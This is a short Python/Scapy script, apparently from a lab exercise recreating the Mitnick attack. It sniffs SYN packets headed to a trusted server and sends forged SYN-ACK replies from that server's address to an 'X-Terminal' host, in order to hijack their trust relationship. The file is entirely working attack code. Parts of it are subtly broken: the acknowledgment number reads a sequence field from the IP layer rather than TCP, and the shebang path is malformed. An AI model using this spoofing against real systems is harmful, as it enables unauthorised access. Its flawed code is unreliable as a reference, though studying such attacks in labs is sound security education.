#!usr/bin/python3
from scapy.all import *
import sys

X_Terminal_IP = "10.0.2.8"
X_Terminal_Port = 1023

Trusted_Server_IP = "10.0.2.10"
Trusted_Server_Port = 9090

# Sniff and Send the spoof packet
def pktspoofing(pkt):
	sequence = 378933595
	old_ip = pkt[IP]
	old_tcp = pkt[TCP]
	# Check if the sniffed packet was a SYN packet
	if old_tcp.flags == "S":
		print("Sending Spoofed ACK Packet For SYN + ACK Packet...")
		ip_layer = IP(src=Trusted_Server_IP, dst=X_Terminal_IP)
		tcp_layer = TCP(sport=Trusted_Server_Port,dport=X_Terminal_Port,flags="SA",seq=sequence, ack= old_ip.seq + 1)
		pkt = ip_layer/tcp_layer # Create the SYN-ACK packet
		send(pkt,verbose=0)

# Filter to be applied while sniffing
myFilter = "tcp and dst host 10.0.2.10 and dst port 9090"
# Start sniffing packets
pkt = sniff(filter=myFilter, prn=pktspoofing)